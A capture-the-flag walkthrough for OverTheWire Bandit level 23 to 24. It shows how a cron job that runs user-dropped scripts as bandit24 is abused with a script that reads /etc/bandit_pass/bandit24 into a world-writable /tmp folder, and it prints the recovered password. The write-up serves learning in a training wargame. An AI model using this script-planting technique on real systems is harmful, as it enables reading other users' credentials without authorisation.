# Bandit Level 23 → Level 24

Level Goal

A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

Commands you may need to solve this level

chmod, cron, crontab, crontab(5) (use “man 5 crontab” to access this)


```bash
bandit23@bandit:~$ ls -l /etc/cron.d/
total 40
-r--r----- 1 root root  47 Apr  3 15:18 behemoth4_cleanup
-rw-r--r-- 1 root root 123 Apr  3 15:10 clean_tmp
-rw-r--r-- 1 root root 120 Apr  3 15:17 cronjob_bandit22
-rw-r--r-- 1 root root 122 Apr  3 15:17 cronjob_bandit23
-rw-r--r-- 1 root root 120 Apr  3 15:17 cronjob_bandit24
-rw-r--r-- 1 root root 201 Apr  8  2024 e2scrub_all
-r--r----- 1 root root  48 Apr  3 15:19 leviathan5_cleanup
-rw------- 1 root root 138 Apr  3 15:19 manpage3_resetpw_job
-rwx------ 1 root root  52 Apr  3 15:21 otw-tmp-dir
-rw-r--r-- 1 root root 396 Jan  9  2024 sysstat
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null


# checking the script for bandit24:
# it executes all scripts in /var/spool/bandit24/foo, and then deletes them
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

shopt -s nullglob

myname=$(whoami)

cd /var/spool/"$myname"/foo || exit 
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." ] && [ "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" "./$i")"
        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
            timeout -s 9 60 "./$i"
        fi
        rm -rf "./$i"
    fi
done

# creating dir in /tmp
bandit23@bandit:~$ mkdir /tmp/b24
bandit23@bandit:~$ ls -ld /tmp/b24
drwxrwxr-x 2 bandit23 bandit23 4096 Jun  2 09:00 /tmp/b24
bandit23@bandit:~$ chmod 777 /tmp/b24

# creating a script that will write the password for bandit24 to a file in /tmp/b24, and making it executable
bandit23@bandit:~$ touch /tmp/b24/b24.sh
bandit23@bandit:~$ vi /tmp/b24/b24.sh
bandit23@bandit:~$ cat /tmp/b24/b24.sh
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/b24/bandit24_psw.txt

bandit23@bandit:~$ chmod +x /tmp/b24/b24.sh 

# copying the script to /var/spool/bandit24/foo, so that it will be executed by the cron job for bandit24
bandit23@bandit:~$ cp /tmp/b24/b24.sh /var/spool/bandit24/foo/

# checking the contents of /tmp/b24 after the cron job has executed, and finding the password for bandit24 in /tmp/b24/bandit24_psw.txt
bandit23@bandit:~$ ls -l /tmp/b24
total 4
-rwxrwxr-x 1 bandit23 bandit23 71 Jun  2 09:04 b24.sh
bandit23@bandit:~$ ls -l /tmp/b24
total 8
-rwxrwxr-x 1 bandit23 bandit23 71 Jun  2 09:04 b24.sh
-rw-rw-r-- 1 bandit24 bandit24 33 Jun  2 09:07 bandit24_psw.txt
bandit23@bandit:~$ cat /tmp/b24/bandit24_psw.txt 
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
bandit23@bandit:~$ 
```


```bash
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/b24/bandit24_psw.txt
```